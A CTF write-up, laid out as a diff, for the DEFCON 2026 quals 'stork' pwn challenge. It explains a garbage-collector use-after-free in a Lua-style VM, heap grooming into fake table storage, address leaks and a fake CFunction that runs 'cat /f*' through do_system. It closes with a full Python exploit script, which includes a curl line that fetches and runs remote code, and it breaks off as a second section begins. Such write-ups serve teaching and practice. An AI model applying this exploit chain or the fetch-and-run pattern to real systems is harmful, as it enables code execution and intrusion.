@@ -1,0 +1,900 @@
+---
+title: DEFCON 2026 quals writeups
+description: 'pretty hard and very unique pwn and rev challs'
+date: '2026-05-24'
+tags:
+  - pwn
+  - rev
+  - heap
+  - garbage collector
+  - use-after-free
+authors:
+  - tlsbollei
+image: './defcon.jpg'
+---
+
+import Callout from '@/components/Callout.astro'
+import Icon from '@/components/Icon.astro'
+
+## pwn - stork (10 solves)
+
+stork is a custom lua 5.5 style bytecode vm written in c++. the loader wants the usual lua header magic (the 0x1b byte, the three bytes for Lua, then 0x55 for the version), and every runtime value is a `std::shared_ptr` to a LuaValue subclass. the interpreter loop is
+`LuaState::run_vm`. the binary is not stripped and it is PIE, which is a gift, because it means the symbol names in the decomp are real and i did not have to guess at any of this. the interpreter is not too interesting, what is interesting is the memory management. stork ships three
+allocators and two background threads
+
+```text
+SystemAllocator   a thin wrapper over malloc and free
+GCAllocator       conservative collector, own thread via run_gc_thread
+BrokerAllocator   arena allocator, own thread via run
+```
+
+the `GCAllocator` runs `GCAllocator::collect` on a timer from its own thread, and the `BrokerAllocator` services allocation and deallocation requests from a queue on a different
+thread. so at any moment there are three threads that can touch the heap, and the free that matters in this challenge happens on a thread you do not control and cannot see from lua
+
+### environment
+
+```text
+Linux stork-64d948664-vw74j 7.0.9 #1 SMP PREEMPT Fri May 22 03:24:17 UTC 2026 x86_64 GNU/Linux
+```
+
+the docker image is ubuntu 26.04 with glibc 2.43, pinned by digest in the Dockerfile and jailed behind kctf and nsjail. before you can talk to it you clear a kctf proof of work, the flag itself is placed by kctf_nsjail_flag_at /flag, which is why a
+plain cat of /flag works once you get code exec. the most important env detail is that the remote does not run the binary directly. the runner wraps it
+
+```python
+subprocess.run(['stdbuf', '-oL', '-i0', './stork', tmp_path])
+```
+
+that stdbuf wrapper shifts the heap layout compared to a bare ./stork, so every offset i calibrated under a naked binary was wrong on the remote, which made me extremely depresdsed. anything you tune locally has to be tuned under the same execution shape or the numbers do not transfer, for reference, under gdb the arena and the libc and the binary all land in a stable place
+around 0x7ffff0000000, which is lovely for reversing and completely unlike the randomized remote. the tracing i used was mostly two breakpoint scripts, one on the broker alloc path and one on the collector, printing the return pointer and size on every alloc and the freed pointer on every dealloc
+
+```gdb
+set pagination off
+break *(_ZN15BrokerAllocator5allocEm+0xc7)
+commands
+  silent
+  continue
+end
+break _ZN15BrokerAllocator7deallocEPvm
+commands
+  silent
+  continue
+end
+run
+```
+
+### object layout
+
+everything derives from LuaValue, which is a vtable plus a type byte plus a value word plus a little inline storage. the type tags i cared about are 0x03 for a boxed integer, 0x16 for a
+CFunction, and 0x30 for a string. the layouts were
+
+```text
+LuaValue (base)
+  +0x00  vtable
+  +0x08  type byte              0x03 NumInt, 0x16 CFunction, 0x30 string
+  +0x10  value word
+  +0x18  inline data
+
+LuaValueTable
+  +0x18  storage                pointer to a LuaTableStorage
+
+LuaTableStorage
+  +0x00  vtable
+  +0x08  bucket_count           power of two
+  +0x10  live_count
+  +0x18  filled
+  +0x20  bucket[0].key          16 bytes per bucket,. key then value
+  +0x28  bucket[0].value
+  ...
+
+LuaValueString (short string)
+  +0x18  inline string bytes    
+
+LuaValueCFunction
+  +0x00  vtable
+```
+
+the table lookup is the primitive i eventually abuse, so it is worth reading the real thing, here is `LuaValueTable::get_value`, lightly cleaned from hex-rays 
+
+```text
+get_value(out, table, key)
+{
+  storage = *(table + 0x18)
+  if ( *(storage + 0x10) == 0 )          
+    return empty(out)
+
+  n     = *(storage + 0x08)             
+  h     = key->hash()                    
+  mask  = n - 1
+  slot  = mask & h                       
+  base  = storage + 0x20                 
+
+  while ( n-- )
+  {
+    kptr = *(base + 16 * (mask & slot))
+    if ( kptr == 0 )                     
+      return empty(out)
+    if ( kptr != 1 )                     
+      if ( kptr->equals(key) )           
+        break
+    slot++
+  }
+
+  value = *(base + 16 * (mask & slot) + 8)
+  return wrap(out, value)                
+}
+```
+
+two things to notice, first, the initial bucket is chosen by `key->hash()` masked with `bucket_count` minus one, and probing from there is linear with
+wraparound and second, the key hash is the value types own idea of a hash and for a boxed integer that hash is just the integer
+
+```text
+LuaValueNumInt::hash(this) { return *(this + 0x10) }   
+```
+
+so if i control the storage (its bucket_count, its keys, its values) and i control the lookup key, then `get_value` walks a table i built and returns a value pointer i chose which is the entire idea behind the exploit. the only problem is getting a `LuaTableStorage` under my control, and that is what the bug is for
+
+### the bug
+
+`fn_ipairs` hands lua an iterator. the iterator is a CFunction whose `std::function` target captures the table being iterated as a `shared_ptr` and the capture is a plain heap object
+
+```text
+fn_ipairs(state, args)
+{
+  tbl = dynamic_cast_to_LuaValueTable(args[0])
+  if ( tbl )
+    refcount_inc(tbl)                    
+
+  cap = operator new(0x10)               
+  *(cap + 0x00) = tbl                    
+  *(cap + 0x08) = tbl_control_block      
+  make_shared_LuaValueCFunction(state, std::function{ cap })
+}
+```
+
+the ownership of the table now lives inside that 16 byte block on the system heap reachable only through the `std::function` target and the collector is conservative. it scans regions word by word and treats any word that falls inside the broker arena as a live reference. here
+is `GCAllocator::scan_range`
+
+```text
+scan_range(addr, len, arena_lo, arena_hi, seen, worklist)
+{
+  off = 0
+  while ( off + 8 <= len )               
+  {
+    w = *(addr + off)
+    off += 8
+    if ( w < arena_lo || w >= arena_hi ) 
+      continue
+    if ( contains(seen, w) )
+      continue
+    insert(seen, w)
+    push(worklist, w)                    
+  }
+}
+```
+`GCAllocator::collect` that calls the above
+
+```text
+collect(this)
+{
+  if ( !broker->get_arena_bounds(&lo, &hi) )
+    return
+  scan_range(vm_stack_base, vm_stack_len, lo, hi, seen, worklist)
+  for region in get_gc_root_regions():
+    scan_range(region.ptr, region.len, lo, hi, seen, worklist)
+  while ( worklist not empty ):
+    obj = pop(worklist)
+    scan_range(obj, malloc_usable_size(obj), lo, hi, seen, worklist)
+  for chunk in tracked_broker_allocs:
+    if ( chunk not in seen ):
+      broker->dealloc(chunk)
+}
+```
+
+now put the two facts together. collect starts from the vm value stack, from the reported root regions, and from object bodies it has already decided are reachable. from each of those it only follows words that point into the broker arena. the table capture is a pointer into
+the system heap, not the arena, so when `scan_range` walks the iterator object it sees that word, checks it against the arena bounds, and skips it. it never goes down into the 16 byte capture, so it never sees the owning reference to the table and the table look dead. the same rule works the other way for stack words. if a bare copy of
+the table pointer is still lying around in a native frame or an operand slot, that word is inside the arena, so `scan_range` marks the table live and my free never happens so this asymmetry is the entire difficulty of the challenge for me and it is why one of my later exploit builds scrubs leftover words before forcing collection
+
+therefore the plan is to iterate a table with ipairs, keep the iterator, drop every direct reference to the table, scrub the stragglers, then force gc. the broker thread reclaims the table object and its storage. the iterator is still perfectly callable, and when lua calls it, the closure
+dereferences its stale captured pointer and calls `get_value` on freed memory
+
+```text
+ipairs_iterator::invoke(out, state, cap)
+{
+  tbl = *(cap + 0x00)                    
+  idx = current_index + 1
+  key = make_NumInt(idx)
+  LuaValueTable::get_value(&out, tbl, &key)   
+}
+```
+
+<Callout type='warn'>
+the key realisation, and the thing that took me longest to accept, is that this is not a
+math bug beecause therre is no off by one, no bad bounds check, no integer overflow but a lifetime
+and visibility argument where the collector is correct about everything it can see but it just cannot
+see through a `std::function` target on the system heap, and it is a little too eager about
+words that happen to look like arena pointers so we just control what the collector sees
+</Callout>
+
+### the reshape
+
+once the table object and its storage are both freed, i replace them with two controlled chunks, both built with `string.pack` from lua and the sizes line up because the table object is a 0x20 allocation and a short string reuses the same class of chunk, and the storage is its own
+chunk that a larger packed string can land on
+here is the thought process behind both grooming attempts 
+
+```text
+reshape 1
+freed 0x20 table object -> 8-byte LuaValueString
+the string is short enough to fit inline, so its content lands at +0x18 which is exactly where LuaValueTable keeps its storage pointer and the dead iterator reads that slot and follows it into our fake storage
+ 
+  string.pack('<L', fake_storage_addr)
+ 
+reshape 2 
+freed storage chunk -> fake LuaTableStorage (fits six qwords)
+  +0x00  vtable        pie + PIE_NUMINT_VPTR  
+  +0x08  bucket_count  1                      
+  +0x10  live_count    1                       
+  +0x18  filled        1
+  +0x20  key           qkey                    
+  +0x28  value         target_ptr              
+ 
+  string.pack('<LLLLLL', pie+PIE_NUMINT_VPTR, 1, 1, 1, qkey, target_ptr)
+```
+
+here recall get_value, with bucket_count 1 the mask is 0, the single bucket is at storage + 0x20, the stored key sits at storage + 0x20 and the value at storage + 0x28. so i pick qkey so that my ookup integer compares equal, and target_ptr is whatever address i want the vm to treat as a
+live LuaValue. call the stale iterator, `get_value` walks my fake storage, and i get target_ptr back wrapped as a value which is an arbitrary read of one machine word, over and over, at any address i can express as an arena relative offset
+
+in the actual solver this was all built as bytecode assembled in python. the constant pool for the final `build_exploit` is where the shape is easiest to see and every one of these constants is doing a job in the chain
+```python
+consts = [
+    k_str('<LLLLLL'),                 # fake LuaTableStorage, six qwords
+    k_str('<L'),                      # reshape the freed table into an 8 byte string
+    k_int(PIE_FN_PRINT + 1),          # what the print CFunction pointer leaks as
+    k_int(PIE_FREE_GOT - 0x10),       # free@GOT minus its header for the libc read
+    k_int(PIE_CFUNC_VPTR),            # vtable for the fake CFunction
+    k_int(0x16),                      # type tag CFunction
+    k_int(0x002A662F20746163),        # cat /f* then a nul LE
+    k_int(1),                         # nonzero std::function manager slot
+    k_int(PIE_SYSTEM_INVOKER_GADGET), # mov rdi, rsi then call [rax+0x18]
+    k_int(LIBC2604_FREE + 1),         # subtract to recover libc base
+    k_int(system_target_off),         # do_system + 2 dodge push misalign
+]
+```
+
+```python
+PIE_FN_PRINT              = 0x24A00
+PIE_FREE_GOT              = 0x3E210
+PIE_CFUNC_VPTR            = 0x3D998
+PIE_NUMINT_VPTR           = 0x3D2E0
+PIE_SYSTEM_INVOKER_GADGET = 0x1287E
+LIBC2604_FREE             = 0xB5660
+LIBC2604_SYSTEM           = 0x5C560
+```
+
+### the chain
+
+#### 1. fin arena base
+
+the fake storage address i pack into the reshape is arena relative, so before i can build any fake storage i have to know where the 64 MiB broker arena lives and the arena is 64 MiB aligned
+
+```text
+get_arena_bounds(this, out_lo, out_hi)
+{
+  live = *(this + 0x118)                  
+  if ( !live ) 
+    return false
+  arena = *(live & 0xFFFFFFFFFC000000)    
+  *out_lo = arena + 2128
+  *out_hi = *(arena + 8)
+  return true
+}
+```
+
+the mask `0xFFFFFFFFFC000000` clears 26 bits, and 2 to the 26 is 0x4000000, which is 64 mb so i scan candidate bases at 64 mb stride and i build one table whose keys are candidate arena bases, then use an ipairs lookup against a pointer i already know, a child proto pointer at a
+known offset so when the lookup hits, the returned value tells me which candidate the proto actually lives under, and from there i compute the arena index. in bytecode this is a loop that sets one key per candidate then runs the iterator once
+
+```python
+code.append(iABC(OP_NEWTABLE, 0, 0, 0))
+loadk(1, 5)   
+loadk(2, 6)   
+loadk(3, 7)  
+loadk(4, 8)   
+loadk(5, 9)   
+loop_pc = len(code)
+code.append(iABC(OP_SETTABLE, 0, 2, 1))
+add(2, 2, 3)
+add(4, 4, 5)
+code.append(iABC(OP_LTI, 4, 128, 0, 0))
+code.append(iJ(OP_JMP, -6))
+```
+
+the remote is randomized so this scan is the part that fails most often but the window that worked was
+
+```text
+STORK_HEAP_START_I = 14144
+STORK_HEAP_COUNT   = 8384
+STORK_PROTO_OFF    = 0x14a0
+```
+
+#### 2. leak PIE
+
+with the arena base known i build my first fake storage and point its value at the live print CFunction plus a fixed offset so reading it back leaks PIE plus PIE_FN_PRINT plus 1, and i subtract to get the base, and the reason i target print specifically is that it is a real CFunction
+that is always registered and always live
+
+```text
+fn_print(state, args)
+{
+  for each arg:
+    lua_tostring_val(&tmp, arg)
+    ostream_insert(cout, tmp)
+  ostream_insert(cout, newline)
+}
+```
+
+once i have PIE i can name every gadget and vtable in the binary
+
+#### 3. leak libc
+
+for libc i want to read `free@GOT` hence i build a fake storage whose value is a fake string object positioned so that reading it returns the bytes at `free@GOT`, then subtract `LIBC2604_FREE` plus 1 to get the libc base but a single bucket is not enough here, because of how
+the read is staged so this storage has two buckets and i rely on the collision behaviour of `get_value`
+
+##### 3.1 why can two keys land on one slot?
+bucket_count is 2, so the mask is 1. the initial slot is key & 1 and for a boxed integer the hash is the integer itself, so if i choose both stored keys to be odd, both hash to slot 1. the first lookup finds its key sitting in slot 1. the second lookup starts at slot 1 as well, does not match the occupant, and the linear probe wraps
+it to slot 0, where the second key and value live so we have two lookups, two different values, one tiny storage, and no need to comp a second address. this is a pretty cool way of reading two chunks in one reshape
+
+
+#### 4. fake CFunction and command execution
+
+pack a string that is a whole fake `LuaValueCFunction`, then use one more fake storage to hand the vm a pointer to that strings inline bytes, typed as a CFunction so when lua does a normal CALL on it, the interpreter dispatches through `LuaValueCFunction::call`, which is the primitive i need
+
+```text
+LuaValueCFunction::call(ret, self, args, argv)
+{
+  if ( *(self + 0x20) == 0 )              
+    throw bad_function_call
+  invoker = *(self + 0x28)                
+  invoker(ret, self + 0x10, args, argv)   
+}
+```
+
+lel, the two fields the dispatch reads are +0x20 (must be nonzero) and +0x28 (the thing it calls), and it passes self + 0x10 as the functor so i point +0x28 at a tiny gadget in the binary
+
+```gdb
+PIE + 0x1287E:
+    mov rdi, rsi
+    call qword [rax+0x18]
+```
+
+when the dispatch calls it, `rsi` holds `self + 0x10` and `rax` holds self, so the gadget moves the address of my command bytes into rdi and then calls the pointer stored at self + 0x18 which is practically the entire reason behind our fake layout
+
+```text
+fake LuaValueCFunction
+  +0x00  pie + PIE_CFUNC_VPTR    CALL dispatch reaches call !!
+  +0x08  0x16                    
+  +0x10  cat /f* then a nul      little endian 0x002A662F20746163 becomes rdi!!!!
+  +0x18  do_system + 2           
+  +0x20  1                       
+  +0x28  pie + 0x1287E           
+```
+
+the one detail that cost a bit of my sanity and a fuck ton of crashes was that the call target is do_system + 2, not the public system entry so entering system at its front runs a push that leaves the stack misaligned by the time it reaches the deeper call, and it dies therefore skipping those two bytes lands with the stack
+aligned and the command runs. i read cat /f* rather than a fixed path because kctf drops the flag at /flag 
+
+### one shot and the flag
+
+the whole thing is a single payload driven by environment variables. the run that produced the
+flag was:
+
+```bash
+s_h_s=14144 \
+s_h_c=8384 \
+s_h_a=0 \
+s_sys=0x5c0b2 \
+s_prt=0x14a0 \
+s_p_qk=0xa5cb0 \
+s_p_st=0xa5c58 \
+s_l_qk=0xa61c0 \
+s_l_st=0xa6138 \
+s_l_rd=0xa6200 \
+s_f_cf=0xa65b8 \
+s_c_qk=0xa5e10 \
+s_c_st=0xa6638 \
+s_r_to=12 \
+s_p_w=16 \
+s_p_to=180 \
+python3 solve.py
+```
+
+```text
+bbb{meep_morp_im_a_stork_and_here_is_a_fork:mkyPo0uRNtX1N2FdtndS_ZQ_5m7y1YOVsw5NT-s3ijHY3KCAInF14vESv3Cpv-ZYESCJULu-Jbv4HcqcLotXt36J6qlCMaRiJkU}
+```
+
+### the rabbit hole autopsy, as always
+
+the elegant chain above really just hides the amount of shit the solver had to deal with, like growing a full menu of probes,
+each one a small lua program answering a single question about the collector and the heap, the exploit itself went through five major remakes before it worked. starting from naive attempts, i then later tried adding a safe pool idea to keep gromming from stepping on itself, then i tried splitting the
+offsets apart so i could calibrate each fake storage independently instead of one global factor, then i finally had a version that faced the scanner honestly and it did so by scrubbing the c stack and the ipairs operand slots before forcing gc, because leftover native stack words holding the table pointer were passing the arena bounds
+check and keeping the table alive, so the free never happened and the whole chain no opped.
+
+### closing notes and lessons learned
+
+- the exploit is very heap layout sensitive, local work has to run inside the ubuntu 26.04 chroot
+  from the Dockerfile, not against the host glibc, or none of the libc offsets mean anything
+- under gdb the layout is stable around 0x7ffff0000000, the remote is randomized, so the
+  stork heap start scan window is the offset i rotate between attempts. the flag did not come
+  on the first try, it came on a window that happened to line up
+- the stdbuf wrapper in the runner is not cosmetic which i learned too late, calibrate under it
+- the post exploitation crash is harmless because the child runs cat /f* and writes the flag before
+  the parent falls over
+
+and the most valuable leson, when pwning a collector running on its own thread, do not look for arithmetic mistakes but look for the one owning a pointer it structurally cannot follow and make sure nothing else accidentally keeps the object alive, the rest is just grooming
+
+### solve
+
+```python
+#!/usr/bin/env python3
+import base64, os, re, socket, ssl, struct, subprocess, sys, time
+from pathlib import Path
+
+TOKEN = ("noxd)
+
+OP_MOVE=0x00;OP_LOADI=0x01;OP_LOADF=0x02;OP_LOADK=0x03;OP_LOADKX=0x04;OP_LOADFALSE=0x05
+OP_LFALSESKIP=0x06;OP_LOADTRUE=0x07;OP_LOADNIL=0x08;OP_GETUPVAL=0x09;OP_SETUPVAL=0x0A
+OP_GETTABUP=0x0B;OP_GETTABLE=0x0C;OP_GETI=0x0D;OP_GETFIELD=0x0E;OP_SETTABUP=0x0F
+OP_SETTABLE=0x10;OP_SETI=0x11;OP_SETFIELD=0x12;OP_NEWTABLE=0x13;OP_SELF=0x14
+OP_ADDI=0x15;OP_ADDK=0x16;OP_SUBK=0x17;OP_MULK=0x18;OP_MODK=0x19;OP_POWK=0x1A
+OP_DIVK=0x1B;OP_IDIVK=0x1C;OP_BANDK=0x1D;OP_BORK=0x1E;OP_BXORK=0x1F;OP_SHRI=0x20
+OP_SHLI=0x21;OP_ADD=0x22;OP_SUB=0x23;OP_MUL=0x24;OP_MOD=0x25;OP_POW=0x26;OP_DIV=0x27
+OP_IDIV=0x28;OP_BAND=0x29;OP_BOR=0x2A;OP_BXOR=0x2B;OP_SHL=0x2C;OP_SHR=0x2D
+OP_MMBIN=0x2E;OP_MMBINI=0x2F;OP_MMBINK=0x30;OP_UNM=0x31;OP_BNOT=0x32;OP_NOT=0x33
+OP_LEN=0x34;OP_CONCAT=0x35;OP_CLOSE=0x36;OP_TBC=0x37;OP_JMP=0x38;OP_EQ=0x39
+OP_LT=0x3A;OP_LE=0x3B;OP_EQK=0x3C;OP_EQI=0x3D;OP_LTI=0x3E;OP_LEI=0x3F;OP_GTI=0x40
+OP_GEI=0x41;OP_TEST=0x42;OP_TESTSET=0x43;OP_CALL=0x44;OP_TAILCALL=0x45;OP_RETURN=0x46
+OP_RETURN0=0x47;OP_RETURN1=0x48;OP_FORLOOP=0x49;OP_FORPREP=0x4A;OP_TFORPREP=0x4B
+OP_TFORCALL=0x4C;OP_TFORLOOP=0x4D;OP_SETLIST=0x4E;OP_CLOSURE=0x4F;OP_VARARG=0x50
+OP_VARARGPREP=0x51;OP_EXTRAARG=0x52
+
+
+def uvar(n):
+    parts = [n & 0x7F]
+    n >>= 7
+    while n:
+        parts.append(0x80 | (n & 0x7F))
+        n >>= 7
+    return bytes(reversed(parts))
+
+def svar(n): return uvar((n << 1) if n >= 0 else ((-n << 1) - 1))
+def lstr(s):
+    if isinstance(s, str): s = s.encode()
+    return uvar(len(s) + 1) + s + b"\0"
+def lsref(i=0): return uvar(0) + uvar(i)
+def hdr():
+    return (b"\x1bLua" + bytes([0x55, 0]) + b"\x19\x93\r\n\x1a\n"
+            + bytes([4]) + struct.pack("<i", -0x5678)
+            + bytes([4]) + struct.pack("<I", 0x12345678)
+            + bytes([8]) + struct.pack("<q", -0x5678)
+            + bytes([8]) + struct.pack("<d", -370.5))
+
+def iABC(op,a=0,b=0,c=0,k=0): return op|(a<<7)|(k<<15)|(b<<16)|(c<<24)
+def iABx(op,a=0,bx=0): return op|(a<<7)|(bx<<15)
+def iJ(op,sj=0): return op|((sj+0xFFFFFF)<<7)
+
+def k_nil(): return b"\x00"
+def k_int(v): return b"\x03" + svar(v)
+def k_str(v): return b"\x04" + lstr(v)
+
+HDR_LEN = len(hdr())
+
+def proto(code, consts=None, upvalues=None, nested=None, maxstack=8,
+          numparams=0, is_vararg=1, line_defined=0, last_line_defined=0):
+    consts = consts or []
+    upvalues = upvalues if upvalues is not None else [bytes([1, 0, 0])]
+    nested = nested or []
+    out = bytearray()
+    out += uvar(line_defined); out += uvar(last_line_defined)
+    out += bytes([numparams, is_vararg, maxstack])
+    out += uvar(len(code))
+    while (HDR_LEN + 1 + len(out)) % 4: out.append(0)
+    for ins in code: out += struct.pack("<I", ins)
+    out += uvar(len(consts))
+    for c in consts: out += c
+    out += uvar(len(upvalues))
+    for u in upvalues: out += u
+    out += uvar(len(nested))
+    for p in nested: out += p
+    out += lsref(0)
+    for _ in range(4): out += uvar(0)
+    return bytes(out)
+
+def chunk(pb, nup=1): return hdr() + bytes([nup]) + pb
+def b64pay(raw): return base64.b64encode(raw) + b"\n\n"
+
+
+SCAN_CHUNK = 64
+
+EXP_REMOTE_PROTO_OFF      = 0x1440
+EXP_PIE_QKEY_OFF          = 0xA5C00
+EXP_PIE_STORAGE_DATA_OFF  = 0xA5BA8
+EXP_LIBC_PTR_QKEY_OFF     = 0xA60D0
+EXP_LIBC_PTR_STORAGE_DATA_OFF = 0xA6048
+EXP_LIBC_READ_QKEY_OFF    = 0xA6110
+EXP_LIBC_READ_STORAGE_DATA_OFF = 0xA6448
+EXP_FAKE_CFUNC_DATA_OFF   = 0xA64C8
+EXP_CALL_QKEY_OFF         = 0xA63D0
+EXP_CALL_STORAGE_DATA_OFF = 0xA6548
+
+PIE_FN_PRINT              = 0x24A00
+PIE_FREE_GOT              = 0x3E210
+PIE_CFUNC_VPTR            = 0x3D998
+PIE_NUMINT_VPTR           = 0x3D2E0
+PIE_SYSTEM_INVOKER_GADGET = 0x1287E
+LIBC2604_FREE             = 0xB5660
+LIBC2604_SYSTEM           = 0x5C560
+
+
+def build_exploit():
+    hsi     = int(os.environ.get("s_h_s",  "8000"), 0)
+    hc      = int(os.environ.get("s_h_c",  "8384"), 0)
+    po      = int(os.environ.get("s_prt",  str(EXP_REMOTE_PROTO_OFF)), 0)
+    adj     = int(os.environ.get("s_h_a",  "-0x2f0"), 0)
+    pqo     = int(os.environ.get("s_p_qk", str(EXP_PIE_QKEY_OFF)), 0)
+    pso     = int(os.environ.get("s_p_st", str(EXP_PIE_STORAGE_DATA_OFF)), 0)
+    lpqo    = int(os.environ.get("s_l_qk", str(EXP_LIBC_PTR_QKEY_OFF)), 0)
+    lpso    = int(os.environ.get("s_l_st", str(EXP_LIBC_PTR_STORAGE_DATA_OFF)), 0)
+    lrqo    = int(os.environ.get("s_l_rd", str(EXP_LIBC_READ_QKEY_OFF)), 0)
+    lrso    = EXP_LIBC_READ_STORAGE_DATA_OFF
+    cdo     = int(os.environ.get("s_f_cf", str(EXP_FAKE_CFUNC_DATA_OFF)), 0)
+    cqo     = int(os.environ.get("s_c_qk", str(EXP_CALL_QKEY_OFF)), 0)
+    cso     = int(os.environ.get("s_c_st", str(EXP_CALL_STORAGE_DATA_OFF)), 0)
+    sys_off = int(os.environ.get("s_sys",  str(LIBC2604_SYSTEM)), 0)
+
+    hbc = 0x7F0000000000
+    hs  = 0x4000000
+    def hoff(off): return off + adj
+    scan_start = hbc + (hsi << 26) + po + 1
+
+    k = [
+        k_str("collectgarbage"), k_str("ipairs"), k_str("string"), k_str("pack"),
+        k_str("print"), k_str("H"),
+        k_int(scan_start), k_int(hs), k_int(hc), k_int(-1), k_int(1), k_int(0),
+        k_str("<LLLLLL"), k_str("<L"), k_str("<LLLLL"),
+        k_int(hoff(pqo)), k_int(hoff(pso)), k_int(PIE_FN_PRINT + 1),
+        k_int(PIE_FREE_GOT - 0x10),
+        k_int(hoff(lpqo)), k_int(hoff(lpso)),
+        k_int(hoff(lrqo)), k_int(hoff(lrso)),
+        k_int(PIE_CFUNC_VPTR), k_int(0x16), k_int(0x002A662F20746163), k_int(1),
+        k_int(PIE_SYSTEM_INVOKER_GADGET),
+        k_int(hoff(cdo)), k_int(hoff(cqo)), k_int(hoff(cso)),
+        k_int(LIBC2604_FREE + 1), k_int(sys_off), k_int(hbc), k_int(po + 1),
+        k_str("<LLLLLLLL"), k_int(2), k_str("<LLLLLLLLL"),
+        k_int(0x30), k_int(PIE_NUMINT_VPTR), k_int(3), k_int(0),
+    ]
+
+    code = []
+    lk   = lambda r, ki: code.append(iABx(OP_LOADK, r, ki))
+    gg   = lambda r, ki: code.append(iABC(OP_GETTABUP, r, 0, ki))
+    ca   = lambda r, n, v: code.append(iABC(OP_CALL, r, n+1, v+1))
+    cv   = lambda r, n=0: code.append(iABC(OP_CALL, r, n+1, 1))
+    add  = lambda d, a, b: code.append(iABC(OP_ADD, d, a, b))
+    sub  = lambda d, a, b: code.append(iABC(OP_SUB, d, a, b))
+    mul  = lambda d, a, b: code.append(iABC(OP_MUL, d, a, b))
+    idiv = lambda d, a, b: code.append(iABC(OP_IDIV, d, a, b))
+    mv   = lambda d, s: code.append(iABC(OP_MOVE, d, s))
+    n1   = lambda r: code.append(iABC(OP_LOADNIL, r, 0, 0))
+
+    gg(90, 0); gg(91, 1); gg(92, 2)
+    code.append(iABC(OP_GETFIELD, 92, 92, 3))
+    gg(93, 4)
+
+    code.append(iABC(OP_NEWTABLE, 0, 0, 0))
+    lk(1, 5); lk(2, 6); lk(3, 7); lk(4, 8); lk(5, 9)
+    lp = len(code)
+    code.append(iABC(OP_SETTABLE, 0, 2, 1))
+    add(2, 2, 3); add(4, 4, 5)
+    code.append(iABC(OP_LTI, 4, 128, 0, 0))
+    code.append(iJ(OP_JMP, -6))
+
+    code.append(iABx(OP_CLOSURE, 6, 0))
+    mv(7, 91); mv(8, 0); ca(7, 1, 3); n1(8); mv(9, 6); ca(7, 2, 2)
+
+    lk(10, 34); sub(10, 7, 10); lk(11, 33); sub(10, 10, 11); lk(11, 7); idiv(88, 10, 11)
+    for r in range(0, 12): n1(r)
+
+    def heap_addr(dst, ok):
+        lk(dst, 7); mul(dst, 88, dst); lk(84, 33); add(dst, dst, 84); lk(84, ok); add(dst, dst, 84)
+
+    def mk_stale(ir, tr):
+        code.append(iABC(OP_NEWTABLE, tr, 0, 0))
+        mv(70, 90); cv(70); mv(70, 90); cv(70)
+        mv(ir, 91); mv(ir+1, tr); ca(ir, 1, 3)
+        n1(tr); n1(ir+1); n1(ir+2)
+        mv(70, 90); cv(70); mv(70, 90); cv(70)
+
+    def do_stale(so, oo, ir, qr, sr, vr, xr, rr):
+        mv(so, 92); lk(so+1, 12); lk(so+2, 11); lk(so+3, 10); lk(so+4, 10)
+        lk(so+5, 11); mv(so+6, qr); mv(so+7, vr); ca(so, 7, 1)
+        mv(oo, 92); lk(oo+1, 13); mv(oo+2, sr); ca(oo, 2, 1)
+        mv(rr, ir); n1(rr+1)
+        if xr is None: n1(rr+2)
+        else: mv(rr+2, xr)
+        ca(rr, 2, 2)
+
+    def clr(a, b):
+        for r in range(a, b+1): n1(r)
+
+    mk_stale(37, 34)
+    heap_addr(10, 15); heap_addr(11, 16)
+    do_stale(20, 28, 37, 10, 11, 10, 93, 40)
+    lk(12, 17); sub(12, 40, 12)
+    clr(10, 11); clr(20, 39)
+
+    mk_stale(37, 34)
+    lk(13, 18); add(13, 12, 13)
+    heap_addr(14, 19); heap_addr(15, 20); heap_addr(16, 21)
+    mv(20, 92); lk(21, 35); lk(22, 11); lk(23, 36); lk(24, 36); lk(25, 36)
+    mv(26, 16); mv(27, 16); mv(28, 14); mv(29, 13); ca(20, 9, 1)
+    mv(30, 92); lk(31, 13); mv(32, 15); ca(30, 2, 1)
+    mv(42, 37); n1(43); n1(44); ca(42, 2, 2)
+    mv(44, 37); n1(45); mv(46, 43); ca(44, 2, 2)
+    lk(18, 31); sub(18, 44, 18); lk(19, 32); add(19, 18, 19)
+    clr(13, 16); clr(20, 39)
+
+    lk(50, 23); add(50, 12, 50); lk(51, 27); add(51, 12, 51)
+    mv(52, 92); lk(53, 12); mv(54, 50); lk(55, 24); lk(56, 25)
+    mv(57, 19); lk(58, 26); mv(59, 51); ca(52, 7, 1)
+
+    mk_stale(37, 34)
+    heap_addr(60, 28)
+    heap_addr(61, 29)
+    mv(20, 92); lk(21, 12); lk(22, 11); lk(23, 10); lk(24, 10); lk(25, 11)
+    mv(26, 61); mv(27, 60); ca(20, 7, 1)
+
+    heap_addr(62, 30)
+    mv(31, 92); lk(32, 13); mv(33, 62); ca(31, 2, 1)
+
+    mv(64, 37); n1(65); n1(66); ca(64, 2, 2)
+    mv(66, 65); cv(66, 0)
+    code.append(iABC(OP_RETURN0))
+    return chunk(proto(code, k, nested=[b""], maxstack=96))
+
+
+def run_remote(raw, host="stork.ctfwithbirds.com", port=1337):
+    data = b""
+    with socket.create_connection((host, port), timeout=10) as sock:
+        with ssl.create_default_context().wrap_socket(sock, server_hostname=host) as s:
+            s.settimeout(90)
+            try: data += s.recv(4096)
+            except TimeoutError: pass
+            if b"token" in data.lower():
+                s.sendall(TOKEN.encode() + b"\n")
+                try: data += s.recv(4096)
+                except TimeoutError: pass
+            m = re.search(rb"a2id\.v2\.\d+\.[0-9a-f]{32}", data)
+            if m:
+                chal = m.group(0).decode()
+                py = Path(".venv/bin/python")
+                py_cmd = str(py) if py.exists() else sys.executable
+                workers = os.environ.get("s_p_w", str(min(24, max(1, os.cpu_count() or 1))))
+                timeout = float(os.environ.get("s_p_to", "90"))
+                solver = Path("/tmp/kctf_pow.py")
+                if solver.exists():
+                    cmd = [py_cmd, str(solver), "solve", "-j", workers, chal]
+                else:
+                    cmd = ["zsh", "-lc",
+                           f"{py_cmd} <(curl -sSL https://pow.ctfwithbirds.com/pow) solve -j {workers} {chal}"]
+                sol = subprocess.check_output(cmd, text=True, timeout=timeout).strip()
+                s.sendall(sol.encode() + b"\n")
+                try: data += s.recv(4096)
+                except TimeoutError: pass
+            s.sendall(b64pay(raw))
+            s.settimeout(float(os.environ.get("s_r_to", "8")))
+            while True:
+                try: part = s.recv(4096)
+                except TimeoutError: break
+                if not part: break
+                data += part
+    return data
+
+
+if __name__ == "__main__":
+    sys.stdout.buffer.write(run_remote(build_exploit()))
+```
+
+## rev - stick drift
+ 
+### what the target is
+ 
+the handout is a single stripped pie called birds_of_defense, an sdl tower-defense game with birds as towers and bugs as enemies
+ 
+```text
